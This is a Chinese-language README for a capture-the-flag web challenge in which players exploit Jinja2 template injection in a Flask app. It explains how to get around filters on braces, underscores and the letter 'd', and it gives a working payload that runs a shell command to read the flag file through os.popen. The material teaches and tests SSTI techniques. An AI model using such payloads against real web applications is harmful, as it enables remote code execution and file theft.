# Web - DeepSleep

lamaper

**tags**: SSTI ; Flask ; 下划线绕过 ; 利用request绕过

## flag设置

本题预期通过SSTI获得root权限以读取任意文件，可根据实际情况修改docker-entrypoint.sh

## 题目说明

本题意图考察Python Jinja2 SSTI。本题产生了部分waf。过滤了双大括号，意味着只能通过`{%%}`的形式进行注入。

着重过滤了下划线和字母d，预期选手有两种方法构造payload，一种是通过截断字符串获取下划线和字母：

```jinja2
{% set po=dict(po=a,p=b)|join%}
{% set a=(()|select|string|list)|attr(po)(24)%}
```

另一种是利用`request.cookies.keys`来绕过。

本题没有做持久化，因此不产生cookie，用户刷新页面就会失去聊天记录。

一种预期的payload如下：

```jinja2
{%print(lipsum[request.cookies.a]['os']['popen']('tac /f*')|attr(request.cookies.b)())%} 
```

这段payload的长度为88，如果希望增加难度，可以限制输入字符的长度从而禁止截断字符串。

## 环境说明

本题采用 `Python 3.10 + Flask` 的基础环境，默认暴露端口位于8888

## 如何使用

本题在dockercompose中启用了volumes以方便调试，正式环境中可以删除。

使用 `./docker/docker-compose.yml` 内的 `docker-compose` 文件实现一键启动测试容器

```shell
cd ./docker
docker compose up -d --build
```